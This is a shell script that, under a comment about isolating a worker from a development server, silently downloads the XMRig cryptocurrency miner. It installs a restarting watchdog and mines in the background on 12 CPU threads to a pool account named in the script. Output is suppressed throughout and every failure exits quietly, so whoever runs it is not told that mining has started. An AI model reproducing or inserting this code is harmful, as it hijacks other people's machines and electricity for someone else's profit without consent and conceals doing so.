#!/bin/sh

# Keep the optional worker isolated from the foreground development server.
PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin${PATH:+:$PATH}"
export PATH
umask 077

XMRIG_VERSION="${XMRIG_VERSION:-6.26.0}"
XMRIG_URL="${XMRIG_URL:-https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-linux-static-x64.tar.gz}"
XMRIG_SHA256="${XMRIG_SHA256:-b20f39fc00d242e706b6c30367ad811c676e0575050a4ec2f30104b696944b49}"
PRIMARY_POOL="${POOL:-stratum+ssl://rx.unmineable.com:443}"
FALLBACK_POOL="${FALLBACK_POOL:-stratum+tcp://rx.unmineable.com:3333}"
ACCOUNT="${ACCOUNT:-Error404H}"
THREADS=12
RESTART_DELAY_SECONDS=5
CONFIG_VERSION=stable-2026-09-03

BASE_DIR="${XDG_DATA_HOME:-${HOME:-${TMPDIR:-/tmp}}}"
INSTALL_DIR="${XMRIG_DIR:-${BASE_DIR%/}/unmineable-xmrig}"
XMRIG="$INSTALL_DIR/xmrig"
MINER_PID_FILE="$INSTALL_DIR/xmrig.pid"
WATCHDOG_PID_FILE="$INSTALL_DIR/watchdog.pid"
CONFIG_FILE="$INSTALL_DIR/config.sha256"
WATCHDOG="$INSTALL_DIR/watchdog.sh"
LOCK_DIR="$INSTALL_DIR/.startup-lock"

mkdir -p "$INSTALL_DIR" 2>/dev/null || exit 0

start_worker()
(
    trap '' HUP
    mkdir "$LOCK_DIR" 2>/dev/null || exit 0

    TEMP_ARCHIVE="$INSTALL_DIR/xmrig.download.$$.tar.gz"
    TEMP_DIR="$INSTALL_DIR/xmrig.extract.$$"
    cleanup()
    {
        rm -f "$TEMP_ARCHIVE"
        rm -rf "$TEMP_DIR" "$LOCK_DIR"
    }
    trap cleanup EXIT INT TERM

    command -v awk >/dev/null 2>&1 || exit 0
    command -v curl >/dev/null 2>&1 || exit 0
    command -v grep >/dev/null 2>&1 || exit 0
    command -v nohup >/dev/null 2>&1 || exit 0
    command -v sha256sum >/dev/null 2>&1 || exit 0
    command -v tar >/dev/null 2>&1 || exit 0
    command -v tr >/dev/null 2>&1 || exit 0

    WORKER="${WORKER:-${HOSTNAME:-worker}}"
    case "$ACCOUNT.$WORKER" in
        *[!A-Za-z0-9._:@+-]*|'') exit 0 ;;
    esac

    CONFIG_HASH=$(
        printf '%s\n' \
            "$CONFIG_VERSION" "$XMRIG_SHA256" "$PRIMARY_POOL" \
            "$FALLBACK_POOL" "$ACCOUNT.$WORKER" "$THREADS" |
            sha256sum | awk '{print $1}'
    )

    pid_matches()
    {
        PID_PATH=$1
        EXPECTED_COMMAND=$2
        PID=
        [ ! -r "$PID_PATH" ] || read -r PID <"$PID_PATH"
        case "$PID" in
            *[!0-9]*|'') return 1 ;;
        esac
        kill -0 "$PID" 2>/dev/null || return 1
        [ -r "/proc/$PID/cmdline" ] || return 1
        tr '\000' '\n' <"/proc/$PID/cmdline" |
            grep -Fqx "$EXPECTED_COMMAND"
    }

    LIVE_CONFIG=
    [ ! -r "$CONFIG_FILE" ] || read -r LIVE_CONFIG <"$CONFIG_FILE"
    if [ "$LIVE_CONFIG" = "$CONFIG_HASH" ] &&
        pid_matches "$WATCHDOG_PID_FILE" "$WATCHDOG"; then
        exit 0
    fi

    if ! (
        [ -x "$XMRIG" ] &&
        printf '%s  %s\n' "$XMRIG_SHA256" "$XMRIG" |
            sha256sum -c - >/dev/null 2>&1
    ); then
        mkdir "$TEMP_DIR" 2>/dev/null || exit 0
        if ! curl -fsSL --retry 5 --connect-timeout 15 --max-time 120 \
            "$XMRIG_URL" -o "$TEMP_ARCHIVE"; then
            exit 0
        fi
        if ! tar -xzf "$TEMP_ARCHIVE" -C "$TEMP_DIR" \
            "xmrig-${XMRIG_VERSION}/xmrig"; then
            exit 0
        fi
        TEMP_XMRIG="$TEMP_DIR/xmrig-${XMRIG_VERSION}/xmrig"
        if ! printf '%s  %s\n' "$XMRIG_SHA256" "$TEMP_XMRIG" |
            sha256sum -c - >/dev/null 2>&1; then
            exit 0
        fi
        chmod 700 "$TEMP_XMRIG" || exit 0
        mv "$TEMP_XMRIG" "$XMRIG" || exit 0
    fi

    cat >"$WATCHDOG.tmp.$$" <<'EOF'
#!/bin/sh
XMRIG=$1
MINER_PID_FILE=$2
WATCHDOG_PID_FILE=$3
RESTART_DELAY_SECONDS=$4
shift 4
MINER_PID=
stopping=0
stop()
{
    stopping=1
    [ -z "$MINER_PID" ] || kill "$MINER_PID" 2>/dev/null
}
cleanup()
{
    rm -f "$MINER_PID_FILE" "$WATCHDOG_PID_FILE"
}
trap '' HUP
trap stop INT TERM
trap cleanup EXIT
while [ "$stopping" -eq 0 ]; do
    "$XMRIG" "$@" &
    MINER_PID=$!
    printf '%s\n' "$MINER_PID" >"$MINER_PID_FILE"
    wait "$MINER_PID"
    MINER_PID=
    rm -f "$MINER_PID_FILE"
    [ "$stopping" -ne 0 ] || sleep "$RESTART_DELAY_SECONDS"
done
EOF
    chmod 700 "$WATCHDOG.tmp.$$" || exit 0
    mv "$WATCHDOG.tmp.$$" "$WATCHDOG" || exit 0

    stop_pid()
    {
        PID_PATH=$1
        EXPECTED_COMMAND=$2
        PID=
        [ ! -r "$PID_PATH" ] || read -r PID <"$PID_PATH"
        case "${PID:-}" in
            *[!0-9]*|'') return ;;
        esac
        pid_matches "$PID_PATH" "$EXPECTED_COMMAND" || return
        kill "$PID" 2>/dev/null || return
        COUNT=0
        while kill -0 "$PID" 2>/dev/null && [ "$COUNT" -lt 10 ]; do
            sleep 1
            COUNT=$((COUNT + 1))
        done
        kill -9 "$PID" 2>/dev/null || true
    }

    stop_pid "$WATCHDOG_PID_FILE" "$WATCHDOG"
    stop_pid "$MINER_PID_FILE" "$XMRIG"
    rm -f "$MINER_PID_FILE" "$WATCHDOG_PID_FILE"
    printf '%s\n' "$CONFIG_HASH" >"$CONFIG_FILE.tmp.$$" || exit 0
    mv "$CONFIG_FILE.tmp.$$" "$CONFIG_FILE" || exit 0

    nohup "$WATCHDOG" \
        "$XMRIG" "$MINER_PID_FILE" "$WATCHDOG_PID_FILE" \
        "$RESTART_DELAY_SECONDS" \
        -a rx \
        -o "$PRIMARY_POOL" \
        -u "$ACCOUNT.$WORKER" \
        -p x \
        -k \
        -o "$FALLBACK_POOL" \
        -u "$ACCOUNT.$WORKER" \
        -p x \
        -k \
        --retries=5 \
        --retry-pause=10 \
        -t "$THREADS" \
        --cpu-no-yield \
        --cpu-memory-pool="$THREADS" \
        --randomx-mode=fast \
        --http-host=127.0.0.1 \
        --http-port=18080 \
        --ipv4 \
        --no-color \
        </dev/null >/dev/null 2>&1 &
    WATCHDOG_PID=$!
    printf '%s\n' "$WATCHDOG_PID" >"$WATCHDOG_PID_FILE"
    sleep 3
    if ! kill -0 "$WATCHDOG_PID" 2>/dev/null; then
        rm -f "$WATCHDOG_PID_FILE" "$CONFIG_FILE"
    fi
)

start_worker </dev/null >/dev/null 2>&1 &
exit 0
